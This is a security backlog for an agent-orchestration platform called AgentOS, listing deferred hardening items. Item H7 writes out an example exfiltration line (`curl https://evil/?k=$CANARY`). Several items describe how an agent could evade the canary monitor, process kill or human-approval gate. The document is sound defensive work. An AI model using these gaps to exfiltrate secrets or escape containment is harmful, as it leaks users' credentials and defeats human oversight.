# AgentOS — Out-of-Scope & Deferred Backlog

Collected from milestones M0–M8 (Plan v3 build, branch `m0-security-patch`). Two kinds of entry:

- **Kill-list / plan-scoped exclusions** — deliberately NOT built per the plan's kill list. Do not revisit without a decision.
- **Follow-ups & deferred hardening** — real work surfaced during implementation/verification, punted to a later milestone or a backlog. Each carries a severity and a suggested home.

Last updated: 2026-07-15.

---

## 1. Kill-list exclusions (deliberate — per Plan v3 §6)

| Item | Milestone | Why excluded |
|---|---|---|
| `.agent-os/credentials.yml` | M0 | Secrets are never project files. Ever. |
| `better-sqlite3` + `drizzle-orm` | M1 | `node:sqlite` already in repo — WAL + FTS5 + loadExtension, no native build. |
| Hand-rolled sandbox | M3 | Select a sandbox (srt / Landlock), never build one. srt installed for claude, codex uses Landlock. |
| Tournament / N-way fan-out + promote-winner | M4 (future) | Multiplies the measured bottleneck (review) by N. v2 experiment only. |
| Mobile PWA + web-push + VAPID + Cloudflare Tunnel | M7 (future) | First-party + MIT native apps ship it better. |
| Signed skill marketplace | future | Native marketplace exists; verified marketplaces breached anyway. Use private hash-pinned deny-by-default catalog. |
| RBAC / multi-user / audit / trust scores | future | Microsoft Agent 365 GA. Ceded. |
| A2A signed Agent Cards | future | Premature protocol work. |
| Multi-provider routing engine | future | `fallbackModel` + OpenRouter exist. Keep only per-run model+cost measurement. |
| FastAPI / Python backend | (prior plan) | Repo is single Next.js app; second runtime fixes nothing. |
| Media / SEO / leads / outreach / video / music tabs | — | Frozen. Move to optional Capability Packs after core works. |

---

## 2. Deferred hardening — env / secret leakage

**H1 — `...process.env` spread in non-agent subprocesses (MEDIUM).**
Full parent env (incl. `ANTHROPIC_API_KEY`/`OPENAI_API_KEY`) leaks to child tools that bypass the validated runner:
`seo/deploy/route.ts:94`, `opendesign/control/route.ts:18`, `thumbnails/generate/route.ts:48`, `seo/research/route.ts:54`, `claudeArtifacts.ts:129`, `hermesPhone.ts:135`, `videoAuto.ts:18`, `notebooklmClient.ts:17`.
Not agent-execution paths (so not an M0 regression), but they bypass the credential broker's minimal-env allowlist.
→ **Home: M3 credential-broker follow-up.**

**H2 — `opendesign/control/route.ts:18` `exec(bash …)` with full env, outside runner validation (MEDIUM).**
Shell path with full env inheritance. Verify `script` is not attacker-controlled.
→ **Home: M3 follow-up / R1.**

**R1 — Runner chokepoint is partial: ~25 files import `node:child_process` directly (HIGH).**
Firewall/broker/canary/sandbox/redaction protect ONLY agents launched via `runner.ts::prepareRun`. 12 of the 25 importers are under `src/app`/`src/features`. The §4.2 invariant ("no `features/**`/`app/**` may import `node:child_process`, enforce with ESLint `no-restricted-imports`, fail CI") is specified but NOT enforced.
- ESLint rule authored but **blocked**: `config-protection` PreToolUse hook forbids editing `eslint.config.mjs`. Rule ready to paste once hook lifted.
- ESLint itself is also broken independently (no TS parser wired — see D1).
- None of the 25 currently spawn an *agent* session (they're ffmpeg/netlify/python/open/etc.), so no numbered M3 item is invalidated — but it is the largest residual attack surface in M3's domain.
→ **Home: M3 follow-up — (a) lift config-protection hook + add rule, (b) migrate the 12 app/features spawns onto the runner.**

---

## 3. Deferred hardening — telemetry / observability

**H3 — OTLP receiver on :4318 is unauthenticated (LOW).**
Any local process can POST fake usage deltas or trigger a canary trip. Localhost-bind + single-user mitigate.
→ **Home: M8 hardening.**

**H4 — Cost double-count in `finishRun` (LOW, fails safe).**
`finishRun` adds stdout-parsed cost additively on top of OTLP deltas → possible cost over-report. Never under-counts, so budget trips early (safe). Reconcile when accuracy matters (M5 review surface displays cost).
→ **Home: M5.**

**H5 — M2.5 progress signals are regex-derived, not first-class events (LOW).**
`filesTouched`/`test-state` derived by regex on the raw event stream. Fine now; wire structured tool-result events when they exist.
→ **Home: M4/M5 (when structured events land).**

---

## 4. Deferred hardening — process / sandbox containment

**H6 — Grandchild `setsid()` escapes process-group SIGKILL (LOW, inherent).**
Group-SIGKILL reaps the child's process group; a grandchild that daemonizes into its own group survives. Standard best-effort ceiling. Real containment is the sandbox (srt/Landlock), which is why M3 is load-bearing.
→ **Home: accepted ceiling; sandbox is the mitigation.**

**H7 — Canary has no outbound-network tap (HIGH, inherent limit).**
Canary/secret is caught in stdout/stderr, OTLP body, and post-run workspace diff/artifact scan — but a raw socket the agent opens (`curl https://evil/?k=$CANARY`) that never logs the payload is invisible without a full egress proxy (out of scope). True silent network exfil is only stopped by a no-network sandbox policy.
→ **Home: sign-off must state this limit explicitly; egress proxy is a separate future milestone.**

---

## 5. Deferred hardening — cross-platform / environment

**H8 — No "declared artifacts" concept on runner RunOptions (LOW).**
M3.8's artifact scan reduced to a workspace scan (where a leak would land anyway). If artifact manifests are meant to exist, that's separate wiring.
→ **Home: M5 (artifact/evidence linking).**

**H9 — `loop/run` `findChrome()` only searches the macOS Playwright path (MEDIUM on non-mac).**
On Linux/WSL the binary is never found → `renderCheck` always returns `"unavailable"` → every HTML Loop build fails closed. Correct security posture, but effectively disables visual builds on WSL. Needs cross-platform Chromium lookup.
→ **Home: M8 cross-platform matrix.**

**H10 — DPAPI interop unverified end-to-end on this host (MEDIUM, blocking M3.4 sign-off).**
Broker assumes `/mnt/c/.../powershell.exe` is callable from WSL. If `[interop] enabled=false` in `/etc/wsl.conf`, DPAPI probe silently fails → falls to libsecret → if no D-Bus, refuses all secret storage (fail-safe, but broker unusable). Run one `storeSecret`/`loadSecret` round-trip on the target machine before declaring M3.4 done.
→ **Home: M3 sign-off checklist.**

**H11 — `kanbanSeo`/`hermesJarvis` pass `cwd: process.cwd()` (LOW).**
Server dir, not a per-run workspace. Satisfies `requireWorkspace` (absolute) but not ideal isolation.
→ **Home: later hardening.**

---

## 6. Deferred — test coverage

**H12 — M2 budget_limits agent/workspace scopes + prepareRun billing-throw path verified by inspection only (LOW).**
Only global scope is unit-tested. Per-scope logic correct by inspection.
→ **Home: M8 eval hardening.**

**H13 — Codex-imported history contributes zero token/cost (LOW).**
`worker.ts` import path emits only `completed` for codex history; no usage captured. Acceptable if historical JSONL lacks usage.
→ **Home: revisit if codex history cost matters.**

**H14 — Cumulative-vs-delta OTLP temporality is an unverified external contract (MEDIUM).**
Delta math assumes Claude Code exports cumulative counters (OTLP default; runner does not set delta preference). Real-CLI fixture captured (2.1.207) confirms current behavior; would break if Claude ships delta temporality.
→ **Home: M8 regression fixture.**

---

## 6b. M3 verification LOW findings (defense-in-depth)

**LOW-1 — Cross-process OTLP secret-value scan degrades to canary-only (LOW).**
`runSecretValues` map is populated in `prepareRun` and read by the OTLP receiver — but only same-process. Route-spawned agents (`spawnStream` in the Next.js process) leave the worker-process receiver without the runId → falls back to canary-only value matching. Mitigated: OTLP body never persisted (only byte length), `OTEL_LOG_TOOL_DETAILS` suppressed at source, canary always caught cross-process. In-process stdout/stderr redaction unaffected.
→ **Home: M8 hardening (or shared secret-value store if worker/next split persists).**

**LOW-2 — `scanWorkspaceForSecrets` caps are silent (LOW).**
Caps (2000 files / 20 hits / 1MB per file) and the `mtime<start` filter drop content with no telemetry. A secret in a >1MB file, beyond the 2000-file budget, or with a backdated mtime is missed by the artifact path with no signal (stdout/OTLP paths still apply). Emit a log/event when a cap truncates the scan.
→ **Home: M8.**

**LOW-3 — Config-firewall directory recursion caps at 200 entries (LOW).**
`configFirewall.ts:22 slice(0,200)` — a `.claude/hooks` dir with >200 files could hide the 201st from the baseline. Raise cap or hash a manifest of names+count so additions past 200 still trip.
→ **Home: M8.**

---

## 7. Tooling debt (blocks a clean CI)

**D1 — ESLint is non-functional (no TS parser).**
Codex-added `eslint.config.mjs` matches `**/*.ts,tsx` with default espree parser → 428 parse errors. `eslint-config-next` + `@eslint/eslintrc` installed but never wired. Blocks R1's `no-restricted-imports` rule from running. `config-protection` hook also guards the file.
→ **Home: standalone fix — wire `eslint-config-next` flat config (FlatCompat), then add R1 rule.**

---

## 8. M5 deferred findings — review surface & checkpoints

**Closure note.** M5 closed 2026-07-13; M6 core (git-ref checkpoints, worktree-first restore, retry/fork/restore verbs) pulled forward into M5 by user decision.

**M5-1 — `isWorkingTreeDirty` fails open when `git status` errors (`checkpoints.ts:44`) (LOW).**
Unreachable via UI (destructive path always sends force). Flip to fail-closed during M8 hardening.
→ **Home: M8 hardening.**

**M5-2 — No `--` separator before git positional args (sha/paths) in `checkpoints.ts` (LOW).**
Defense-in-depth; values are DB-sourced today.
→ **Home: M8 hardening.**

**M5-3 — `hashAction` normalization is shallow (LOW, fails safe).**
Arrays sorted but not deduped; command hashed as an opaque string (whitespace variants hash differently). Fail-safe: over-prompts, never under-authorizes.
→ **Home: backlog.**

**M5-4 — `listTriage` recency window (20) can hide an old pending-approval run (LOW).**
Push the pending filter into the SQL `WHERE` when run volume grows.
→ **Home: backlog (when run volume grows).**

**M5-5 — `/runs` triage index has no nav link anywhere (LOW).**
Reachable only by direct URL. Add an entry when touching the shell UI.
→ **Home: next shell-UI change.**

**M5-6 — Review page doesn't surface `parent_run_id` lineage / checkpoint list for retried-forked children (LOW).**
Nice-to-have for triage.
→ **Home: backlog.**

**M5-7 — `consumeGrant` execution gate has no production caller yet (LOW).**
Executor wiring lands when action re-execution ships.
→ **Home: action re-execution milestone.**

---

## 9. M6 deferred findings — checkpoints / restore / workspace isolation (design pass, 2026-07-13)

**Closure note.** M6 closed 2026-07-13, all seven items verified PASS.

**M6-1 — Distinct claude-native checkpoint id deferred (LOW, per plan R2).**
Deferred per plan R2 ("record which checkpoint was used over implement"). `session_id` already captured as `external_run_id` and emitted as a `native_checkpoint` event. Revisit when the Claude Code changelog exposes a stable checkpoint id in stream-json.
→ **Home: revisit on Claude Code stream-json checkpoint-id support.**

**M6-2 — Ref pruning makes commits unreachable but AgentOS never forces `git gc` (LOW, deliberate).**
Reclamation left to git auto-gc; forcing gc in user repos is invasive.
→ **Home: accepted (git auto-gc).**

**M6-3 — `allocatePort` bind-then-release has a TOCTOU window (LOW).**
Acceptable for the single-worker loop. Add a DB port-lease table if concurrent workers land.
→ **Home: concurrent-worker milestone.**

**M6-4 — fs-mode checkpoints (non-git workspaces): 512MiB hard cap (LOW).**
Loud `checkpoint_unavailable`; ignore-set mirrors runner `SCAN_SKIP` — no partial silent snapshots. Larger workspaces stay uncheckpointable until a streaming/tar design is justified.
→ **Home: accepted ceiling; streaming/tar design if justified.**

**M6-5 — fs-checkpoint content hashes stored but not verified at restore time (LOW).**
Snapshot content hashes are recorded but not re-checked when a fs-mode checkpoint is restored. Add an integrity gate on `~/.agentic-os` snapshot reads.
→ **Home: M8 hardening.**

**M6-6 — `checkpointStorageSummary` spawns git per workspace on `/runs` GET (LOW).**
Disk-usage panel shells out to git for each workspace on every `/runs` GET. Cache or revalidate the boundary if the page gets hot.
→ **Home: backlog (if `/runs` gets hot).**

**M6-7 — `m6-runner-env` real-spawn test can flake under full concurrent vitest load (LOW).**
OS port/spawn timing, not product logic. Serialize the test or add an `allocatePort` retry if it recurs.
→ **Home: backlog (if it recurs).**

---

## 10. M7 deferred findings — memory with provenance (2026-07-15)

**Closure note.** M7 closed 2026-07-15 (commits `95d95f5` feature, `858147e` promote-path integrity fix). Trust-tier quarantine, FTS5 search, vault gate, promote/demote audit all verified. A background security review of `95d95f5` surfaced the promote-path double-promotion bug — fixed in `858147e`, not deferred. The items below are the residuals.

**M7-1 — FTS5 MATCH query-syntax robustness (LOW).**
User-supplied search strings are passed to FTS5 `MATCH` parameterized (no SQL injection), but FTS5 has its own query grammar (`OR`/`AND`/`NEAR`/quoted phrases/column filters). Unbalanced quotes or stray operators can raise a parse error rather than returning empty. Adversarial test (M8.8) confirms quarantine invariant holds and search never silently mixes trusted/quarantined, but a hardened path would wrap the FTS5 query in try/catch and fall back to a sanitized/substring search on parse failure.
→ **Home: M8+ search hardening / backlog.**

**M7-2 — Concurrent promotion race on the same record (LOW, single-user tolerable).**
Two simultaneous `POST /api/memory/promote` for one id can both succeed; SQLite has no row-level locking and the promote path is not wrapped in a transaction. The `858147e` fix made promotion single-path with vault-failure rollback, but does not serialize concurrent promotions. Acceptable under the localhost single-user threat model; revisit if concurrent writers land.
→ **Home: concurrent-worker milestone / transaction wrapping.**

**M7-3 — `/api/memory/stats` leaks quarantined-record counts by origin (LOW).**
The stats route exposes counts per origin without auth. Acceptable localhost-only; restrict to the caller's own records if multi-user is ever introduced.
→ **Home: accepted (localhost); revisit on multi-user.**

**M7-4 — Store-level actor validation is defense-in-depth, not the primary gate (LOW).**
`promoteMemory`/`demoteMemory` now reject `actor !== 'user'` (added in `858147e`), but the authoritative human-in-the-loop check remains route-level. There is no cryptographic/session proof that a `POST /api/memory/promote` originated from the human UI rather than a same-box agent hitting localhost — the invariant is "unauthenticated localhost, single trusted user." A per-session confirm token minted by the UI (or origin/CSRF check) would harden this if the threat model ever widens.
→ **Home: accepted ceiling (localhost single-user); revisit if trust model widens.**

---

## 11. M8 deferred findings — evals, hardening, release (2026-07-15)

**Closure note.** M8 Phase 1 (adversarial regression suite, 8 themes) and Phase 2 (eval harness, 90-case corpus, dashboard) built this session; CI matrix + standalone distribution landed. Adversarial suite found **zero** product vulns in M0–M7 — all invariants held. Items below are scoped-out follow-ups.

**M8-1 — MCP tool-description sanitizer does not exist (MEDIUM).**
Tool/manifest description strings read from CLI output or manifest YAML are surfaced without HTML-entity escaping. The `javascript:`-URL slice is closed (`hermesMcp.ts` now allowlists `http:`/`https:` for the manifest `source` field), but a full sanitizer (HTML-escape descriptions before render, allowlist auth types) is not built. M8.3 regression tests are `skip`-marked with the upgrade path documented. Risk today is low (descriptions displayed as-is, not executed/rendered as HTML).
→ **Home: M8+ / when MCP descriptions are rendered in richer UI.**

**M8-2 — Live eval runner is a guarded stub (deferred by design).**
`evalRunner.ts` fixture mode is the CI-default deterministic baseline ($0, no network). Live mode is guarded on `AGENTOS_EVAL_LIVE=1` and throws a "not yet implemented" stub — the real live-agent orchestration call is not wired. Hybrid design was the approved decision; live path lands when the orchestration layer is ready.
→ **Home: live-eval milestone (needs orchestration wiring).**

**M8-3 — Corpus fixtures are synthetic (LOW).**
The 90 corpus cases use procedurally-varied fixture metrics, not recorded real runs. Once the live runner (M8-2) ships, capture real execution snapshots to replace the synthetic fixtures so the baseline reflects true model behavior.
→ **Home: follows M8-2 (fixture generation from live runs).**

**M8-4 — Eval dashboard has no pagination / export / trend-over-time (LOW).**
`/eval` renders per-case and per-category baseline with variance, but the per-case table is unpaginated (fine at 90, add pagination past ~100), has no CSV export, and shows a point-in-time baseline with no historical trend. Add when the corpus or run-history grows.
→ **Home: backlog (when corpus/run volume grows).**

**M8-5 — M8.15 exit gate is only partially verifiable from a single dev box (MEDIUM, process).**
"Fresh install on all three OSes → verified diff on a real issue in <15 min" can only be confirmed by real GitHub Actions runs on `ubuntu/macos/windows-latest` with cold caches — not from this WSL box (warm Turbopack cache, single OS, faster/slower hardware differs). The CI matrix (`.github/workflows/ci.yml`) makes it checkable; actual sign-off requires pushing the branch and observing the first matrix run's per-OS duration and green status.
→ **Home: M8.15 sign-off — push branch, observe real CI matrix.**

**M8-6 — Windows native `node:sqlite` + Turbopack unproven; WSL2 is the documented fallback (MEDIUM on Windows).**
`node:sqlite` (experimental, Node 22.5+) and the Turbopack build have not been exercised on native `windows-latest`. The CI matrix keeps Windows in with `fail-fast: false`; per Plan v3 §M8, shipping WSL2 as the supported Windows path is an acceptable answer if native doesn't go green. Confirm on the first real Windows CI run before claiming native Windows support.
→ **Home: M8.15 sign-off / Windows CI observation.**

**M8-7 — Repo-wide ESLint debt; CI lint step is non-blocking (D-series, LOW).**
The eslint flat-config globals gap (only React/JSX declared) was fixed this session so `console`/`process`/browser/vitest no longer false-positive as `no-undef`, and all files added M7/M8 are lint-clean. Residual real debt remains in pre-existing files (unused-vars, `explicit-any`, `require`-imports across `src/components/**`, `scripts/x.mjs`, `search/route.ts`, `x-api.test.ts`). The CI `lint` step is `continue-on-error: true` so the M8 matrix gates on typecheck/test/eval; a full burn-down is the ongoing D-series effort, not an M8 exit criterion.
→ **Home: D-series lint burn-down (continues past M8).**

---

## Severity roll-up

| Severity | Items |
|---|---|
| HIGH | R1 (runner chokepoint partial), H7 (no egress tap — inherent) |
| MEDIUM | H1, H2 (env leakage), H9 (Chrome cross-platform), H10 (DPAPI unverified), H14 (OTLP temporality), M8-1 (MCP description sanitizer), M8-5 (exit-gate needs real CI), M8-6 (Windows native unproven) |
| LOW | H3, H4, H5, H6, H8, H11, H12, H13, M5-1..M5-7, M6-1..M6-7, M7-1..M7-4, M8-3, M8-4, M8-7 |
| Deferred by design | M8-2 (live eval runner — hybrid decision) |
| Tooling | D1 (ESLint TS parser — resolved via a26f800 + M8.18 globals fix; residual D-series lint-debt burn-down ongoing) |

Nothing here blocks M0–M8 exit gates (all verified independently). These are the accumulated "noticed but not in this milestone's scope" items, homed to the milestone or backlog where they belong. M8's own exit gate (M8-5, M8-6) requires a real multi-OS CI run to sign off.
